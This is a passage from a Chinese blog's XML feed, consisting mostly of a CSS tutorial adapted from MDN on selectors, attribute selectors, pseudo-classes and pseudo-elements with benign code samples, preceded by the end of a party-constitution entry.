第五十五条　中国共产党的党徽党旗是中国共产党的象征和标志。党的各级组织和每一个党员都要维护党徽党旗的尊严。要按照规定制作和使用党徽党旗。</p>]]></content>
    
    
    <categories>
      
      <category>党</category>
      
    </categories>
    
    
    <tags>
      
      <tag>党</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>css</title>
    <link href="/blog/2022/11/20/css/"/>
    <url>/blog/2022/11/20/css/</url>
    
    <content type="html"><![CDATA[<h1 id="css"><a href="#css" class="headerlink" title="css"></a>css</h1><blockquote><ol><li><a href="https://www.w3school.com.cn/css/index.asp">https://www.w3school.com.cn/css/index.asp</a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Learn">https://developer.mozilla.org/zh-CN/docs/Learn</a></li></ol></blockquote><p><img src="https://developer.mozilla.org/en-US/docs/Learn/Getting_started_with_the_web/CSS_basics/css-declaration-small.png" alt="图解 CSS 声明"></p><p>整个结构称为 <strong>规则集</strong>（通常简称“规则”），各部分释义如下：</p><ul><li><p>选择器（<strong>Selector</strong>）</p><p>HTML 元素的名称位于规则集开始。它选择了一个或多个需要添加样式的元素（在这个例子中就是 <code>p</code> 元素）。要给不同元素添加样式只需要更改选择器就行了。</p></li><li><p>声明（<strong>Declaration</strong>）</p><p>一个单独的规则，如 <code>color: red;</code> 用来指定添加样式元素的<strong>属性</strong>。</p></li><li><p>属性（<strong>Properties</strong>）</p><p>改变 HTML 元素样式的途径。（本例中 <code>color</code> 就是 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/p">&#96;&#96;</a> 元素的属性。）CSS 中，由编写人员决定修改哪个属性以改变规则。</p></li><li><p>属性的值（Property value）</p><p>在属性的右边，冒号后面即<strong>属性的值</strong>，它从指定属性的众多外观中选择一个值（我们除了 <code>red</code> 之外还有很多属性值可以用于 <code>color</code> ）。</p></li></ul><p>注意其他重要的语法：</p><ul><li>每个规则集（除了选择器的部分）都应该包含在成对的大括号里（<code>&#123;&#125;</code>）。</li><li>在每个声明里要用冒号（<code>:</code>）将属性与属性值分隔开。</li><li>在每个规则集里要用分号（<code>;</code>）将各个声明分隔开。</li></ul><p>如果要同时修改多个属性，只需要将它们用分号隔开，就像这样：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span> &#123;<br>  <span class="hljs-attribute">color</span>: red;<br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">500px</span>;<br>  <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid black;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-1-选择器"><a href="#2-1-选择器" class="headerlink" title="2.1 选择器"></a>2.1 选择器</h3><h4 id="不同类型的选择器"><a href="#不同类型的选择器" class="headerlink" title="不同类型的选择器"></a><strong>不同类型的选择器</strong></h4><p>选择器有许多不同的类型。上面只介绍了<strong>元素选择器</strong>，用来选择 HTML 文档中给定的元素。但是选择操作可以更加具体。下面是一些常用的选择器类型：</p><table><thead><tr><th align="left">选择器名称</th><th align="left">选择的内容</th><th align="left">示例</th></tr></thead><tbody><tr><td align="left">元素选择器（也称作标签或类型选择器）</td><td align="left">所有指定 (该) 类型的 HTML 元素</td><td align="left"><code>p</code> 选择 <code>&lt;p&gt;</code></td></tr><tr><td align="left">ID 选择器</td><td align="left">具有特定 ID 的元素（单一 HTML 页面中，每个 ID 只对应一个元素，一个元素只对应一个 ID）</td><td align="left"><code>#my-id</code> 选择 <code>&lt;p id=&quot;my-id&quot;&gt;</code> 或 <code>&lt;a id=&quot;my-id&quot;&gt;</code></td></tr><tr><td align="left">类选择器</td><td align="left">具有特定类的元素（单一页面中，一个类可以有多个实例）</td><td align="left"><code>.my-class</code> 选择 <code>&lt;p class=&quot;my-class&quot;&gt;</code> 和 <code>&lt;a class=&quot;my-class&quot;&gt;</code></td></tr><tr><td align="left">属性选择器</td><td align="left">拥有特定属性的元素</td><td align="left"><code>img[src]</code> 选择 <code>&lt;img src=&quot;myimage.png&quot;&gt;</code> 而不是 <code>&lt;img&gt;</code></td></tr><tr><td align="left">伪（Pseudo）类选择器</td><td align="left">特定状态下的特定元素（比如鼠标指针悬停）</td><td align="left"><code>a:hover</code> 仅在鼠标指针悬停在链接上时选择 <code>&lt;a&gt;</code>。</td></tr></tbody></table><h4 id="选择器列表"><a href="#选择器列表" class="headerlink" title="选择器列表"></a><strong>选择器列表</strong></h4><p>如果你有多个使用相同样式的 CSS 选择器，那么这些单独的选择器可以被混编为一个“选择器列表”，这样，规则就可以应用到所有的单个选择器上了。例如，如果我的<code>h1</code>和<code>.special</code>类有相同的 CSS，那么我可以把它们写成两个分开的规则。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">h1</span> &#123;<br>  <span class="hljs-attribute">color</span>: blue;<br>&#125;<br><br><span class="hljs-selector-class">.special</span> &#123;<br>  <span class="hljs-attribute">color</span>: blue;<br>&#125;<br></code></pre></td></tr></table></figure><p>我也可以将它们组合起来，在它们之间加上一个逗号，变为选择器列表。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">h1</span>, <span class="hljs-selector-class">.special</span> &#123;<br>  <span class="hljs-attribute">color</span>: blue;<br>&#125;<br></code></pre></td></tr></table></figure><p>空格可以在逗号前或后，你可能还会发现如果每个选择器都另起一行，会更好读些。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">h1</span>,<br><span class="hljs-selector-class">.special</span> &#123;<br>  <span class="hljs-attribute">color</span>: blue;<br>&#125;<br></code></pre></td></tr></table></figure><p>在下面的实时示例中，试着把两个有相同声明的选择器组合起来。外观在组合起来以后应该还是一样的。</p><p>当你使用选择器列表时，如果任何一个选择器无效 (存在语法错误)，那么整条规则都会被忽略。</p><h4 id="选择器种类"><a href="#选择器种类" class="headerlink" title="选择器种类"></a><strong>选择器种类</strong></h4><p><strong>标签属性选择器</strong></p><p>这组选择器根据一个元素上的某个标签的属性的存在以选择元素的不同方式：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span><span class="hljs-selector-attr">[title]</span> &#123; &#125;<br></code></pre></td></tr></table></figure><p>或者根据一个有特定值的标签属性是否存在来选择：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span><span class="hljs-selector-attr">[href=<span class="hljs-string">&quot;https://example.com&quot;</span>]</span> &#123; &#125;<br></code></pre></td></tr></table></figure><h4 id="伪类与伪元素"><a href="#伪类与伪元素" class="headerlink" title="伪类与伪元素"></a><strong>伪类与伪元素</strong></h4><p>这组选择器包含了伪类，用来样式化一个元素的特定状态。例如<code>:hover</code>伪类会在鼠标指针悬浮到一个元素上的时候选择这个元素：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:hover</span> &#123; &#125;<br></code></pre></td></tr></table></figure><p>它还可以包含了伪元素，选择一个元素的某个部分而不是元素自己。例如，<code>::first-line</code>是会选择一个元素（下面的情况中是<code>&lt;p&gt;</code>）中的第一行，类似<code>&lt;span&gt;</code>包在了第一个被格式化的行外面，然后选择这个<code>&lt;span&gt;</code>。</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-selector-tag">p</span><span class="hljs-selector-pseudo">::first-line</span> &#123; &#125;<br></code></pre></td></tr></table></figure><h4 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a><strong>运算符</strong></h4><p>最后一组选择器可以将其他选择器组合起来，更复杂的选择元素。下面的示例用运算符（<code>&gt;</code>）选择了<code>&lt;article&gt;</code>元素的初代子元素。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">article</span> &gt; <span class="hljs-selector-tag">p</span> &#123; &#125;<br></code></pre></td></tr></table></figure><h4 id="全局选择器"><a href="#全局选择器" class="headerlink" title="全局选择器"></a><strong>全局选择器</strong></h4><p>全局选择器，是由一个星号（<code>*</code>）代指的，它选中了文档中的所有内容（或者是父元素中的所有内容，比如，它紧随在其他元素以及邻代运算符之后的时候）。下面的示例中，我们已经用全局选择器，移去了所有元素上的外边距。这就是说，和浏览器以外边距隔开标题和段的方式默认加上的样式不同的是，每个物件都紧紧地挨在一起，我们不能那么容易就看清楚不同的段。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">* &#123;<br>    <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这种行为有时能在“重置样式表”中看到，其中所有浏览器所做的样式化都会被忽略。这些一度很受欢迎，但是把所有的样式化忽略掉的话，通常就是指，你必须做把这些样式带回来的工作！因此我们应小心使用全局选择器，以处理诸如下面所述之类的很特殊的情况。</p><p>全局选择器的一种用法是让选择器更易读，更明显地表明它们的作用。例如，如果我想选中任何<code>&lt;article&gt;</code>元素的第一子元素，不论它是什么元素，都给它加粗，我可以将<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:first-child"><code>:first-child</code></a>选择器（我们将会在<a href="https://developer.mozilla.org/zh-CN/docs/Learn/CSS/Building_blocks/Selectors/Pseudo-classes_and_pseudo-elements">伪类和伪元素</a>课中进一步了解）用作<code>&lt;article&gt;</code>元素选择器的一个后代选择器：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">article</span> <span class="hljs-selector-pseudo">:first</span>-child &#123;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>但是这会和<code>article:first-child</code>混淆，而后者选择了作为其他元素的第一子元素的<code>&lt;article&gt;</code>元素。</p><p>为了避免这种混淆，我们可以向<code>:first-child</code>选择器加入全局选择器，这样选择器所做的事情很容易就能看懂。选择器正选中<code>&lt;article&gt;</code>元素的<em>任何</em>第一子元素：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">article</span> *<span class="hljs-selector-pseudo">:first</span>-child &#123;<br><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="多个类被应用的时候指向一个元素"><a href="#多个类被应用的时候指向一个元素" class="headerlink" title="多个类被应用的时候指向一个元素"></a><strong>多个类被应用的时候指向一个元素</strong></h4><p>你能对一个元素应用多个类，然后分别指向它们，或者仅仅在选择器中存在所有这些类的时候选择这一元素。在你的站点上，构建可以以不同方式组合起来的组件的时候，这会有用。</p><p>在下面的示例中，有一个包含了一条笔记的<code>&lt;div&gt;</code>。灰色的边框在盒子带有<code>notebox</code>类的时候应用。如果它还有一个<code>warning</code>或是<code>danger</code>类，我们改变<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/border-color"><code>border-color</code></a>。</p><p>为了告诉浏览器我们只想匹配带有所有这些类的元素，我们可以将这些类不加空格地连成一串。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;notebox&quot;</span>&gt;</span><br>    This is an informational note.<br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;notebox warning&quot;</span>&gt;</span><br>    This note shows a warning.<br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;notebox danger&quot;</span>&gt;</span><br>    This note shows danger!<br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;danger&quot;</span>&gt;</span><br>    This won&#x27;t get styled — it also needs to have the notebox class<br><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.notebox</span> &#123;<br>  <span class="hljs-attribute">border</span>: <span class="hljs-number">4px</span> solid <span class="hljs-number">#666</span>;<br>  <span class="hljs-attribute">padding</span>: .<span class="hljs-number">5em</span>;<br>&#125;<br><br><span class="hljs-selector-class">.notebox</span><span class="hljs-selector-class">.warning</span> &#123;<br>  <span class="hljs-attribute">border-color</span>: orange;<br>  <span class="hljs-attribute">font-weight</span>: bold;<br>&#125;<br><br><span class="hljs-selector-class">.notebox</span><span class="hljs-selector-class">.danger</span> &#123;<br>  <span class="hljs-attribute">border-color</span>: red;<br>  <span class="hljs-attribute">font-weight</span>: bold;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20230225135912071-20230305%2010:50:47.png" alt="image-20230225135912071"></p><h4 id="ID-选择器"><a href="#ID-选择器" class="headerlink" title="ID 选择器"></a><strong>ID 选择器</strong></h4><p>ID 选择器开头为<code>#</code>而非句点，不过基本上和类选择器是同种用法。可是在一篇文档中，一个 ID 只会用到一次。它能选中设定了<code>id</code>的元素，你可以在 ID 前面加上类型选择器，只指向元素和 ID 都匹配的类。在下面的示例里，你可以看看这两种用法。</p><p><em>备注：</em>正如我们在和特定性相关的课里面学到的那样，ID 所指特定，会优先于大多数其他选择器。所以很难处理它们。大多数情况下，给一个元素加个类，而不是使用 ID，会更好。不过要是 ID 是唯一一种指定这个元素的方式的话——也许是因为你没法访问标记标记因此不能编辑——这种方式可行。</p><h4 id="属性选择器"><a href="#属性选择器" class="headerlink" title="属性选择器"></a><strong>属性选择器</strong></h4><p>从 HTML 的学习中，你已经知道，元素可以带有属性，它提供了关于如何标记的更详细信息。CSS 中，你能用属性选择器来选中带有特定属性的元素。本节课中，我们将会为你展示如何使用这些很有用的选择器。</p><p><strong>存否和值选择器</strong></p><p>这些选择器允许基于一个元素自身是否存在（例如<code>href</code>）或者基于各式不同的按属性值的匹配，来选取元素。</p><table><thead><tr><th align="left">选择器</th><th align="left">示例</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><code>[attr]</code></td><td align="left"><code>a[title]</code></td><td align="left">匹配带有一个名为<em>attr</em>的属性的元素——方括号里的值。</td></tr><tr><td align="left"><code>[attr=value]</code></td><td align="left"><code>a[href=&quot;https://example.com&quot;]</code></td><td align="left">匹配带有一个名为<em>attr</em>的属性的元素，其值正为<em>value</em>——引号中的字符串。</td></tr><tr><td align="left"><code>[attr~=value]</code></td><td align="left"><code>p[class~=&quot;special&quot;]</code></td><td align="left">匹配带有一个名为<em>attr</em>的属性的元素，其值正为<em>value</em>，或者匹配带有一个<em>attr</em>属性的元素，其值有一个或者更多，至少有一个和<em>value</em>匹配。注意，在一列中的好几个值，是用空格隔开的。</td></tr><tr><td align="left">&#96;[attr</td><td align="left">&#x3D;value]&#96;</td><td align="left">&#96;div[lang</td></tr></tbody></table><p>下面的示例中，你可以看到这些选择器是怎样使用的。</p><ul><li>使用<code>li[class]</code>，我们就能匹配任何有 class 属性的选择器。这匹配了除了第一项以外的所有项。</li><li><code>li[class=&quot;a&quot;]</code>匹配带有一个<code>a</code>类的选择器，不过不会选中一部分值为<code>a</code>而另一部分是另一个用空格隔开的值的类，它选中了第二项。</li><li><code>li[class~=&quot;a&quot;]</code>会匹配一个<code>a</code>类，不过也可以匹配一列用空格分开、包含<code>a</code>类的值，它选中了第二和第三项。</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Attribute presence and value selectors<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span>&gt;</span>Item 1<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;a&quot;</span>&gt;</span>Item 2<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;a b&quot;</span>&gt;</span>Item 3<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;ab&quot;</span>&gt;</span>Item 4<span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">li</span><span class="hljs-selector-attr">[class]</span> &#123;<br>    <span class="hljs-attribute">font-size</span>: <span class="hljs-number">200%</span>;<br>&#125;<br><br><span class="hljs-selector-tag">li</span><span class="hljs-selector-attr">[class=<span class="hljs-string">&quot;a&quot;</span>]</span> &#123;<br>    <span class="hljs-attribute">background-color</span>: yellow;<br>&#125;<br><br><span class="hljs-selector-tag">li</span><span class="hljs-selector-attr">[class~=<span class="hljs-string">&quot;a&quot;</span>]</span> &#123;<br>    <span class="hljs-attribute">color</span>: red;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Yoonalis/img@master/blog/image-20230225140919072-20230305%2010:51:16.png" alt="image-20230225140919072"></p><p><strong>子字符串匹配选择器</strong></p><p>这些选择器让更高级的属性的值的子字符串的匹配变得可行。例如，如果你有<code>box-warning</code>和<code>box-error</code>类，想把开头为“box-”字符串的每个物件都匹配上的话，你可以用<code>[class^=&quot;box-&quot;]</code>来把它们两个都选中。</p><table><thead><tr><th align="left">选择器</th><th align="left">示例</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><code>[attr^=value]</code></td><td align="left"><code>li[class^=&quot;box-&quot;]</code></td><td align="left">匹配带有一个名为<em>attr</em>的属性的元素，其值开头为<em>value</em>子字符串。</td></tr><tr><td align="left"><code>[attr$=value]</code></td><td align="left"><code>li[class$=&quot;-box&quot;]</code></td><td align="left">匹配带有一个名为<em>attr</em>的属性的元素，其值结尾为<em>value</em>子字符串</td></tr><tr><td align="left"><code>[attr*=value]</code></td><td align="left"><code>li[class*=&quot;box&quot;]</code></td><td align="left">匹配带有一个名为<em>attr</em>的属性的元素，其值的字符串中的任何地方，至少出现了一次<em>value</em>子字符串。</td></tr></tbody></table><p>下个示例展示了这些选择器的用法：</p><ul><li><code>li[class^=&quot;a&quot;]</code>匹配了任何值开头为<code>a</code>的属性，于是匹配了前两项。</li><li><code>li[class$=&quot;a&quot;]</code>匹配了任何值结尾为<code>a</code>的属性，于是匹配了第一和第三项。</li><li><code>li[class*=&quot;a&quot;]</code>匹配了任何值的字符串中出现了<code>a</code>的属性，于是匹配了所有项。</li></ul><p><strong>大小写敏感</strong></p><p>如果你想在大小写不敏感的情况下，匹配属性值的话，你可以在闭合括号之前，使用<code>i</code>值。这个标记告诉浏览器，要以大小写不敏感的方式匹配 ASCII 字符。没有了这个标记的话，值会按照文档语言对大小写的处理方式，进行匹配——HTML 中是大小写敏感的。</p><p>下面的示例中，第一个选择器将会匹配一个开头为<code>a</code>的值，这样它只匹配了第一项，因为另外两项开头是大写的 A。第二个选择器使用了大小写不敏感的标记，于是匹配了所有项。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">li</span><span class="hljs-selector-attr">[class^=<span class="hljs-string">&quot;a&quot;</span>]</span> &#123;<br>    <span class="hljs-attribute">background-color</span>: yellow;<br>&#125;<br><br><span class="hljs-selector-tag">li</span><span class="hljs-selector-attr">[class^=<span class="hljs-string">&quot;a&quot;</span> i]</span> &#123;<br>    <span class="hljs-attribute">color</span>: red;<br>&#125;<br></code></pre></td></tr></table></figure><p><em>备注：</em>此外还有一个更加新的<code>s</code>值，它会强制在上下文的匹配正常为大小写不敏感的时候，强行要求匹配时大小写敏感。不过，在浏览器中它不太受支持，而且在上下文为 HTML 时也没啥用。</p><h4 id="伪类和伪元素"><a href="#伪类和伪元素" class="headerlink" title="伪类和伪元素"></a>伪类和伪元素</h4><p>下一组我们将了解的选择器被称为<strong>伪类</strong>和<strong>伪元素</strong>。这一类选择器的数量众多，通常用于很明确的目的。一旦你了解了如何使用它们，你便可以通过查阅列表来寻找合适的那一项以完成你想要的选择。与之前一样，每个选择器相关的 MDN 页面都将帮助你了解各浏览器的支持情况。</p><p><strong>什么是伪类</strong></p><p>伪类是选择器的一种，它用于选择处于特定状态的元素，比如当它们是这一类型的第一个元素时，或者是当鼠标指针悬浮在元素上面的时候。它们表现得会像是你向你的文档的某个部分应用了一个类一样，帮你在你的标记文本中减少多余的类，让你的代码更灵活、更易于维护。</p><p>伪类就是开头为冒号的关键字：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">:pseudo-class-name<br></code></pre></td></tr></table></figure><p>我们可以使用<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:first-child"><code>:first-child</code></a>伪类选择器——这将<em>一直</em>选中文章中的第一个子元素，我们将不再需要编辑 HTML（编辑 HTML 并不总是可行，也许是因为它是由一个 CMS 生成的）。</p><p>所有的伪类以同样的方式实现。它们选中你的文档中处于某种状态的那部分，表现得就像是你已经向你的 HTML 加入类一样。看下 MDN 上的另外几个示例：</p><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:last-child"><code>:last-child</code></a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:only-child"><code>:only-child</code></a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:invalid"><code>:invalid</code></a></li></ul><p>更多伪类用法参考：<a href="https://developer.mozilla.org/en-US/docs/Web/CSS/:-moz-broken">https://developer.mozilla.org/en-US/docs/Web/CSS/:-moz-broken</a></p><h4 id="用户行为伪类"><a href="#用户行为伪类" class="headerlink" title="用户行为伪类"></a>用户行为伪类</h4><p>一些伪类只会在用户以某种方式和文档交互的时候应用。这些<strong>用户行为伪类</strong>，有时叫做<strong>动态伪类</strong>，表现得就像是一个类在用户和元素交互的时候加到了元素上一样。案例包括：</p><ul><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:hover"><code>:hover</code></a>——上面提到过，只会在用户将指针挪到元素上的时候才会激活，一般就是链接元素。</li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/:focus"><code>:focus</code></a>——只会在用户使用键盘控制，选定元素的时候激活。</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:link</span>,<br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:visited</span> &#123;<br>    <span class="hljs-attribute">color</span>: rebeccapurple;<br>    <span class="hljs-attribute">font-weight</span>: bold;<br>&#125;<br><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:hover</span> &#123;<br>    <span class="hljs-attribute">color</span>:hotpink;<br>&#125;   <br></code></pre></td></tr></table></figure><p><strong>伪元素</strong></p><p>伪元素以类似方式表现，不过表现得是像你往标记文本中加入全新的 HTML 元素一样，而不是向现有的元素上应用类。伪元素开头为双冒号<code>::</code>。</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-symbol">:</span><span class="hljs-symbol">:pseudo-element-name</span><br></code></pre></td></tr></table></figure><blockquote><p><strong>备注：</strong>一些早期的伪元素曾使用单冒号的语法，所以你可能会在代码或者示例中看到。现代的浏览器为了保持后向兼容，支持早期的带有单双冒号语法的伪元素。</p></blockquote><p>例如，如果你想选中一段的第一行，你可以把它用一个<code>&lt;span&gt;</code>元素包起来，然后使用元素选择器；不过，如果包起来的单词&#x2F;字符数目长于或者短于父元素的宽度，这样做会失败。由于我们一般不会知道一行能放下多少单词&#x2F;字符——因为屏幕宽度或者字体大小改变的时候这也会变——通过改变 HTML 的方式来可预测地这么做是不可能的。</p><p><code>::first-line</code>伪元素选择器会值得信赖地做到这件事——即使单词&#x2F;字符的数目改变，它也只会选中第一行。</p><p>这表现得就像是<code>&lt;span&gt;</code>神奇地包在第一个被格式化的行一样，每当行长改变的时候还会更新。</p><p>你可以看到它把两段的第一行都选中了。</p><p><strong>把伪类和伪元素组合起来</strong></p><p>如果你想让第一段的第一行加粗，你需要把<code>:first-child</code>和<code>::first-line</code>选择器放到一起。试着编辑前面的实时示例，让它使用下面的 CSS。这里的意思是，我们想选择一个<code>&lt;article&gt;</code>元素里面的第一个<code>&lt;p&gt;</code>元素的第一行。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">article</span> <span class="hljs-selector-tag">p</span><span class="hljs-selector-pseudo">:first</span>-child<span class="hljs-selector-pseudo">::first-line</span> &#123;<br>  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">120%</span>;<br>  <span class="hljs-attribute">font-weight</span>: bold;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>生成带有::before 和::after 的内容</strong></p><p>有一组特别的伪元素，它们和<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/content"><code>content</code></a>属性一同使用，使用 CSS 将内容插入到你的文档中中。c</p><p>你能用这些插入一个文本字符串，和在下面的实时示例里那样。试着改变<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/content"><code>content</code></a>属性的文本值，看看输出是怎么改变的。你也能改变<code>::before</code>伪元素为<code>::after</code>，看到这段文本插入到了元素的末尾而不是开头。</p><p>从 CSS 插入文本字符串，我们并不会在 Web 浏览器上经常这么做，因为对于一些屏幕阅读器来说，文本是不可见的，而且对于未来别人的查找和编辑也不是很方便。</p><p>这些伪元素的更推荐的用法是插入一个图标，例如下面的示例加入的一个小箭头，作为一个视觉性的提示，而且我们并不希望屏幕阅读器读出它。</p><p>这些伪元素经常用于插入空字符串，其后可以像页面上的其他元素被样式化。</p><p>下个示例，我们已经用 <code>::before</code>伪元素加入了个空字符串。我们把它设为了<code>display: block</code>，以让它可以用 width 和 height 进行样式化。然后我们可以用 CSS 像任何元素那样样式化。你可以摆弄 CSS，改变它的外观和行为。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;box&quot;</span>&gt;</span>Content in the box in my HTML page.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight css"><table><tr><td class="gutter"><pre><span 